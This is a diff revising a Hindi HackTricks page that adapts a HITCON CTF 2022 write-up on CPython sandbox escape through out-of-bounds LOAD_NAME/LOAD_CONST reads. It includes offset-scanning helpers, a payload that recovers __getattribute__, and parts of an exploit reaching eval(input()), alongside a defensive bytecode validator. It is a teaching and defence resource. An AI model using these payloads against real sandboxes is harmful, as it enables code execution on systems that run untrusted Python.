@@ -1,12 +1,14 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-यह पेज Splitline के मूल HITCON CTF 2022 "V O I D" writeup और exploit chain को अपनाता है।<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
+
+यह पेज Splitline के original HITCON CTF 2022 "V O I D" writeup और exploit chain को अनुकूलित करता है।<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-`LOAD_NAME` या `LOAD_CONST` operand, जानबूझकर छोटा किए गए `co_names` या `co_consts` tuple के बाहर पढ़ सकता है। इस challenge में, unreachable dummy names का उपयोग तब तक किया जाता है जब तक किसी पास की entry में `__getattribute__` जैसी उपयोगी attribute न मिल जाए।<sup>[[1]](#references)</sup>
+`LOAD_NAME` या `LOAD_CONST` operand, जानबूझकर छोटी की गई `co_names` या `co_consts` tuple के बाहर read कर सकता है। इस challenge में unreachable dummy names का उपयोग तब तक किया जाता है, जब तक पास की किसी entry में `__getattribute__` जैसा उपयोगी attribute न मिल जाए।<sup>[[1]](#references)</sup>
 
-बाकी payload, sandbox escape बनाने के लिए recover किए गए name का पुनः उपयोग करता है।<sup>[[1]](#references)</sup>
+इसके बाद का payload उस recovered name का पुनः उपयोग करके sandbox escape बनाता है।<sup>[[1]](#references)</sup>
 
 ### Overview <a href="#overview-1" id="overview-1"></a>
 
@@ -19,13 +21,13 @@ print(eval(code, {'__builtins__': {}}))
 ```
 इनपुट को Python code object में compile किया जाता है, फिर wrapper `eval` को call करने से पहले इसके `co_consts` और `co_names` को empty tuples से replace कर देता है।<sup>[[1]](#references)[[5]](#references)</sup>
 
-ऐसी कोई भी generated instruction जो अभी भी इन tables में से किसी एक को index करती है, interpreter को crash कर सकती है या build के आधार पर किसी adjacent object pointer को expose कर सकती है।<sup>[[1]](#references)</sup>
+ऐसी कोई भी generated instruction, जो अभी भी इन tables में से किसी एक को index करती है, interpreter को crash कर सकती है या build के आधार पर किसी adjacent object pointer को expose कर सकती है।<sup>[[1]](#references)</sup>
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
 segfault कैसे होता है?
 
-`[a, b, c]` जैसे list expression के लिए compiler consecutive operands के साथ `LOAD_NAME` instructions emit करता है:<sup>[[1]](#references)[[2]](#references)</sup>
+`[a, b, c]` जैसे list expression के लिए compiler consecutive operands वाली `LOAD_NAME` instructions emit करता है:<sup>[[1]](#references)[[2]](#references)</sup>
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -33,11 +35,11 @@ segfault कैसे होता है?
 6 BUILD_LIST               3
 8 RETURN_VALUE
 ```
-यदि `co_names` को `()` से replace किया जाता है, तो bytecode में अभी भी `LOAD_NAME 2` रहता है; इसलिए unchecked tuple access `IndexError` उठाने के बजाय tuple के बाहर से pointer fetch कर सकता है।<sup>[[1]](#references)[[3]](#references)</sup>
+यदि `co_names` को `()` से replace किया जाता है, तो bytecode में अभी भी `LOAD_NAME 2` मौजूद रहता है; इसलिए unchecked tuple access tuple के बाहर के pointer को fetch कर सकता है, बजाय `IndexError` raise करने के।<sup>[[1]](#references)[[3]](#references)</sup>
 
-`LOAD_NAME` और `LOAD_CONST` यहां core primitives हैं: इनके integer operands क्रमशः `co_names` और `co_consts` में entries का चयन करते हैं।<sup>[[1]](#references)[[2]](#references)</sup>
+`LOAD_NAME` और `LOAD_CONST` यहाँ core primitives हैं: इनके integer operands क्रमशः `co_names` और `co_consts` में entries चुनते हैं।<sup>[[1]](#references)[[2]](#references)</sup>
 
-CPython के dispatch में, `LOAD_CONST` चयनित tuple entry को retrieve करके उसे push करता है; release builds में unchecked tuple accessor का उपयोग किया जाता है:<sup>[[3]](#references)</sup>
+CPython के dispatch में, `LOAD_CONST` चुनी गई tuple entry को retrieve करके उसे push करता है; release builds एक unchecked tuple accessor का उपयोग करते हैं:<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,22 +49,22 @@ PUSH(value);
 FAST_DISPATCH();
 }
 ```
-Target interpreter पर बढ़ते हुए `LOAD_NAME` operands को probe करें, ताकि उपयोगी entries का map बनाया जा सके। Challenge environment में Splitline ने 700 से अधिक के उपयोगी offsets देखे, लेकिन layout build-specific होता है; आसपास की memory का निरीक्षण करने के लिए debugger मददगार हो सकता है।<sup>[[1]](#references)</sup>
+Target interpreter पर बढ़ते हुए `LOAD_NAME` operands को probe करके उपयोगी entries को map करें। Splitline ने challenge environment में 700 से ऊपर के उपयोगी offsets देखे, लेकिन layout build-specific होता है; आसपास की memory inspect करने के लिए debugger मददगार हो सकता है।<sup>[[1]](#references)</sup>
 
 ### Exploit जनरेट करना <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-जब कोई offset उपयोगी name देता है, तो out-of-range lookup को एक unreachable expression में रखें और reachable attribute access से उसी `co_names` slot को reference करें।<sup>[[1]](#references)</sup>
+जब कोई offset उपयोगी name देता है, तो out-of-range lookup को unreachable expression में रखें और reachable attribute access से उसी `co_names` slot को reference करें।<sup>[[1]](#references)</sup>
 
-उदाहरण के लिए, यदि offset 5 `__getattribute__` देता है, तो उस name को slot 5 पर रखें, जबकि false branch उपयोगी lookup करे:<sup>[[1]](#references)</sup>
+उदाहरण के लिए, यदि offset 5 `__getattribute__` देता है, तो उस name को slot 5 पर रखें, जबकि false branch उपयोगी lookup करती है:<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]
 ```
-> Recovered text का `__getattribute__` होना आवश्यक नहीं है; payload को serve करने वाला कोई भी identifier उस slot में आ सकता है।<sup>[[1]](#references)</sup>
+> पुनर्प्राप्त पाठ `__getattribute__` होना आवश्यक नहीं है; payload के लिए उपयोग किया जाने वाला कोई भी identifier उस slot में रह सकता है।<sup>[[1]](#references)</sup>
 
-Compiler एक ही name की repeated occurrences के लिए `co_names` slot का पुनः उपयोग करता है, जैसा कि disassembly दिखाता है:<sup>[[1]](#references)[[2]](#references)</sup>
+Compiler एक ही name की बार-बार होने वाली occurrences के लिए `co_names` slot का पुनः उपयोग करता है, जैसा कि disassembly में दिखाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -79,7 +81,7 @@ Compiler एक ही name की repeated occurrences के लिए `co_nam
 24 BUILD_LIST               1
 26 RETURN_VALUE
 ```
-क्योंकि `LOAD_ATTR` अपना name `co_names` के माध्यम से resolve करता है, reachable branch उस slot का पुनः उपयोग कर सकती है; नए CPython versions में packed operands का वर्णन नीचे दिए गए version notes में किया गया है।<sup>[[1]](#references)[[2]](#references)</sup>
+क्योंकि `LOAD_ATTR` अपना name `co_names` के माध्यम से भी resolve करता है, reachable branch उस slot का पुनः उपयोग कर सकती है; नए CPython versions पर packed operands का वर्णन नीचे दिए गए version notes में है।<sup>[[1]](#references)[[2]](#references)</sup>
 
 छोटे non-negative integers को constants के बिना boolean expressions से बनाया जा सकता है:<sup>[[1]](#references)</sup>
 
@@ -90,9 +92,9 @@ Compiler एक ही name की repeated occurrences के लिए `co_nam
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-मूल exploit ने challenge की length limit के भीतर रहने के लिए constants के बजाय names का उपयोग किया।<sup>[[1]](#references)</sup>
+Original exploit ने constants के बजाय names का उपयोग किया ताकि challenge की length limit के भीतर रहा जा सके।<sup>[[1]](#references)</sup>
 
-यह helper खाली `co_names` tuple के साथ code object बनाकर candidate name offsets को scan करता है।<sup>[[1]](#references)</sup>
+यह helper empty `co_names` tuple के साथ code object बनाकर candidate name offsets को scan करता है।<sup>[[1]](#references)</sup>
 ```python
 from types import CodeType
 from opcode import opmap
@@ -219,19 +221,19 @@ builtins['eval'](builtins['input']())
 ```
 ---
 
-### Version notes और affected opcodes (Python 3.11–3.13)
+### Version notes and affected opcodes (Python 3.11–3.13)
 
-- CPython 3.11–3.13 पर, instructions अभी भी code object की constant और name tables को index करने के लिए integer operands का उपयोग करती हैं। यदि इनमें से कोई tuple referenced index से छोटा है, तो unchecked access किसी adjacent object pointer को पढ़ सकता है और crash कर सकता है या उस पर operate कर सकता है; सटीक behavior interpreter build पर निर्भर करता है।<sup>[[2]](#references)[[3]](#references)</sup>
-- `LOAD_CONST consti` और (3.12+) `RETURN_CONST consti`, `co_consts[consti]` को पढ़ते हैं।<sup>[[2]](#references)</sup>
+- CPython 3.11–3.13 पर, instructions अभी भी code object की constant और name tables को index करने के लिए integer operands का उपयोग करती हैं। यदि इनमें से कोई tuple referenced index से छोटा है, तो unchecked access किसी adjacent object pointer को read कर सकता है और crash कर सकता है या उस पर operate कर सकता है; exact behavior interpreter build पर निर्भर करता है।<sup>[[2]](#references)[[3]](#references)</sup>
+- `LOAD_CONST consti` और (3.12+) `RETURN_CONST consti`, `co_consts[consti]` को read करते हैं।<sup>[[2]](#references)</sup>
 - Direct name-table users में `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, और (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` शामिल हैं।<sup>[[2]](#references)</sup>
 - `LOAD_GLOBAL namei` और `LOAD_ATTR namei`, `co_names[namei >> 1]` का उपयोग करते हैं; low bit documented NULL/method behavior को नियंत्रित करता है। (3.12+) `LOAD_SUPER_ATTR namei`, `co_names[namei >> 2]` का उपयोग करता है और अपने low bits में two flags pack करता है।<sup>[[2]](#references)</sup>
-- Python 3.11+ ने adaptive/inline caches प्रस्तुत किए, जो instructions के बीच hidden `CACHE` entries जोड़ते हैं। `co_code` बनाते समय handcrafted bytecode को इन entries का ध्यान रखना होगा।<sup>[[2]](#references)</sup>
+- Python 3.11+ ने adaptive/inline caches introduce किए, जो instructions के बीच hidden `CACHE` entries जोड़ते हैं। `co_code` बनाते समय handcrafted bytecode को इन entries का ध्यान रखना चाहिए।<sup>[[2]](#references)</sup>
 
-Practical implication: bytecode layout और recovered offsets release- और build-specific होते हैं। इस technique और इससे generated किसी भी payload पर निर्भर करने से पहले उसे target CPython version के विरुद्ध test करें।<sup>[[2]](#references)</sup>
+Practical implication: bytecode layout और recovered offsets release- और build-specific होते हैं। इस technique और किसी भी generated payload पर भरोसा करने से पहले, उन्हें target CPython version के विरुद्ध test करें।<sup>[[2]](#references)</sup>
 
-### उपयोगी OOB indexes के लिए Quick scanner (3.11+/3.12+ compatible)
+### Useful OOB indexes के लिए quick scanner (3.11+/3.12+ compatible)
 
-यदि आप high-level source के बजाय सीधे bytecode से interesting objects की probe करना पसंद करते हैं, तो आप minimal code objects generate कर सकते हैं और indices को brute-force कर सकते हैं। नीचे दिया गया helper target interpreter के `dis` metadata के अनुसार inline caches insert करता है।<sup>[[2]](#references)</sup>
+यदि आप high-level source के बजाय सीधे bytecode से interesting objects को probe करना पसंद करते हैं, तो आप minimal code objects generate कर सकते हैं और indices को brute-force कर सकते हैं। नीचे दिया गया helper target interpreter के `dis` metadata के अनुसार inline caches insert करता है।<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -272,11 +274,11 @@ print(idx, type(obj), repr(obj)[:80])
 ```
 नोट्स
 - इसके बजाय names को probe करने के लिए `LOAD_CONST` को `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` से बदलें और target opcode के लिए stack usage तथा packed operand को समायोजित करें।<sup>[[2]](#references)</sup>
-- यदि आवश्यक हो, तो indexes >255 तक पहुंचने के लिए `EXTENDED_ARG` या `arg` के multiple bytes का उपयोग करें। यह helper केवल low operand byte emit करता है, इसलिए बड़े indexes के लिए raw byte construction या multiple loads आवश्यक हैं।<sup>[[2]](#references)</sup>
+- आवश्यकता होने पर indexes >255 तक पहुंचने के लिए `EXTENDED_ARG` या `arg` के multiple bytes का उपयोग करें। यह helper केवल low operand byte emit करता है, इसलिए बड़े indexes के लिए raw byte construction या multiple loads आवश्यक हैं।<sup>[[2]](#references)</sup>
 
 ### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
 
-एक बार जब आप ऐसा `co_consts` index पहचान लेते हैं जो builtins module को resolve करता है, तो stack को manipulate करके `co_names` के बिना `eval(input())` को reconstruct कर सकते हैं। Official B01lers CTF 2024 का `awpcode` material इसी OOB-read pattern को document करता है।<sup>[[4]](#references)</sup>
+जब आप `co_consts` index की पहचान कर लेते हैं जो builtins module पर resolve होता है, तो stack में हेरफेर करके `co_names` के बिना `eval(input())` को reconstruct कर सकते हैं। Official B01lers CTF 2024 `awpcode` material इसी OOB-read pattern को document करता है।<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,13 +287,13 @@ print(idx, type(obj), repr(obj)[:80])
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-यह stack-only approach तब उपयोगी है जब कोई challenge आपको `co_code` पर direct control देता है, जबकि `co_consts=()` और `co_names=()` को अनिवार्य करता है; यह source-level tricks से बचता है और bytecode stack operations तथा tuple builders का उपयोग करके payloads को छोटा रख सकता है।<sup>[[4]](#references)</sup>
+यह stack-only approach तब उपयोगी है जब कोई challenge आपको `co_code` पर सीधा नियंत्रण देता है और `co_consts=()` तथा `co_names=()` लागू करता है; यह source-level tricks से बचता है और bytecode stack operations तथा tuple builders का उपयोग करके payloads को छोटा रख सकता है।<sup>[[4]](#references)</sup>
 
 ### Sandboxes के लिए Defensive checks और mitigations
 
-यदि आप ऐसा Python sandbox लिख रहे हैं जो untrusted code को compile या evaluate करता है, तो bytecode द्वारा उपयोग किए गए tuple indexes के bounds-checking के लिए CPython पर निर्भर न रहें। उन्हें execute करने से पहले code objects को validate करें।<sup>[[2]](#references)[[3]](#references)</sup>
+यदि आप ऐसा Python sandbox लिख रहे हैं जो untrusted code को compile या evaluate करता है, तो bytecode द्वारा उपयोग किए गए tuple indexes पर bounds-check करने के लिए CPython पर निर्भर न रहें। उन्हें execute करने से पहले code objects को validate करें।<sup>[[2]](#references)[[3]](#references)</sup>
 
-Practical validator (`co_consts`/`co_names` तक OOB access को reject करता है)।<sup>[[2]](#references)</sup>
+Practical validator (co_consts/co_names तक OOB access को reject करता है)।<sup>[[2]](#references)</sup>
 ```python
 import dis
 
@@ -330,13 +332,13 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # eval(c, {'__builtins__': {}})
 ```
 अतिरिक्त mitigation ideas
-- Untrusted input पर arbitrary `CodeType.replace(...)` की अनुमति न दें, या परिणामी code object पर strict structural checks जोड़ें।
-- Untrusted code को CPython semantics पर निर्भर रहने के बजाय OS-level sandboxing (seccomp, job objects, containers) वाले separate process में चलाने पर विचार करें।
+- अविश्वसनीय input पर arbitrary `CodeType.replace(...)` की अनुमति न दें, या resulting code object पर strict structural checks जोड़ें।
+- CPython semantics पर निर्भर रहने के बजाय untrusted code को OS-level sandboxing (seccomp, job objects, containers) के साथ अलग process में चलाने पर विचार करें।
 
 ## References
 
-- [1] [Splitline का HITCON CTF 2022 writeup "V O I D" (इस technique और high-level exploit chain का origin)](https://blog.splitline.tw/hitcon-ctf-2022/)
-- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands और inline caches)](https://docs.python.org/3.13/library/dis.html)
+- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (इस technique और high-level exploit chain का origin)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands, और inline caches)](https://docs.python.org/3.13/library/dis.html)
 - [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
 - [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
 - [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
